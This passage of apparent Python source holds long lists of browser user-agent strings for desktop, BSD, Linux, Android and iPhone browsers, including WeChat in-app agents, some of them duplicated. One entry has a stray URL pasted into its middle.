     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']

useragend = [
  """Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16
Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4
Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53
Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53
Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
